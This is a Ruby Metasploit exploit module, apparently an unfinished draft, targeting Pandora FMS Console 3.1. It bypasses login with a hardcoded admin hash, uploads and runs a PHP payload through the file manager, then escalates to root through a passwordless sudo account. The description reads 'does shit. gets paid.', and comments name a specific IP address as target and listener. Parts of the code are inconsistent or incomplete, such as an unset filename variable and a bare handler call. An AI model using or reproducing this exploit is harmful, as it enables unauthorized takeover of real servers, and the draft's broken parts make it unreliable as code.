##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Pandora FMS Console Upload",
      'Description'    => %q{ 
        does shit. gets paid.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'winterspite' # Vulnerability discovery and Metasploit module
        ],
      'References'      =>
        [
        ],
      'Payload'        =>
        {
          'BadChars' => "",
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl python',
            }
        },
      'Platform'        => ['unix'],
      'Arch'            => ARCH_CMD,
      'Targets'         =>
        [
          ['PC100609', {}]
        ],
      'Privileged'      => true,
      'DisclosureDate'  => "Jan 29 2014",
      'DefaultTarget'   => 0))

    register_options(
      [
       Opt::RPORT(80),
       OptString.new('TARGETURI', [true, 'The base path to the Pandora instance', '/']),
      ], self.class)
  end

  def on_new_session(client)
    print_status("#{peer} - Trying to escalate privileges to root")
    [
      # ignore SIGHUP so the server doesn't kill our root shell
      "trap '' HUP",
      # Spawn a pty for su/sudo
      "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
      # Su to the passwordless "artica" account
      "su - artica",
      # The "artica" use has sudo rights without the need for a
      # password, thus gain root priveleges
      "sudo -s",
    ].each do |command|
      vprint_status(command)
      client.shell_write(command + "\n")
    end

    super
  end

  def check
    # Check version
    print_status("#{peer} - Trying to detect Pandora FMS Console")

    res = send_request_cgi({
     'method' => 'GET',
     'uri'    => normalize_uri(target_uri.path,"/pandora_console/index.php")
    })

    if ( res && res.code == 200 && res.body =~ /v3\.1 Build PC100609/i )
      print_good("#{peer} - Pandora FMS Console Detected!")
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    print_status("#{peer} - Sending payload")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, "/pandora_console/index.php"),
      'vars_post'   => {
        'loginhash_data' => '21232f297a57a5a743894a0e4a801fc3',
        'loginhash_user' => 'admin',
        'loginhash' => '1'
      }
    })

    if !res || res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, exploit probably failed!")
    end
    if( res.headers["Set-Cookie"] ) 
      @cookie= res.headers["Set-Cookie"].split(";").first
    end

    upload
## Use Rex::MIME to create a request containing the payload
# http://192.241.218.238/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager
    

    print_status("Attempting to run #{@payload_filename}...")
    send_request_cgi({ 'uri' => normalize_uri(target_uri.to_s, "include/#{@payload_filename}"),
    })
## http://www.exploit-db.com/exploits/20173/
    handler 


## We uploaded evil.php to the /pandora_console/images/ directory
## Set to listen on 192.241.218.238 9909

  end


  def upload
    boundary = "---------------------------#{rand_text_alphanumeric(10)}"
    data_post  = "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"file\"; filename=\"#{@fname}\"\r\n"
    data_post << "Content-Type: application/octet-stream\r\n"
    data_post << "\r\n"
    data_post << "#{get_write_exec_payload(:unlink_self=>true)}"
    data_post << "\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"go\"\r\n"
    data_post << "\r\nGo\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"directory\"\r\n"
    data_post << "\r\ninclude\r\n"
    data_post << "--#{boundary}\r\n"
    data_post << "Content-Disposition: form-data; name=\"upload_file\"\r\n"
    data_post << "\r\n1\r\n"
    data_post << "#{boundary}\r\n"
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => "/pandora_console/index.php",
      'vars_get' => {
      'sec' => 'gsetup',
      'sec2' => 'godmode/setup/file_manager',
    },
      'ctype'   => "multipart/form-data; boundary=#{boundary}",
      'data'    => data_post,
      'cookie'  => @cookie,
    })

    return res
  rescue ::Rex::ConnectionError
    return nil
  end



end


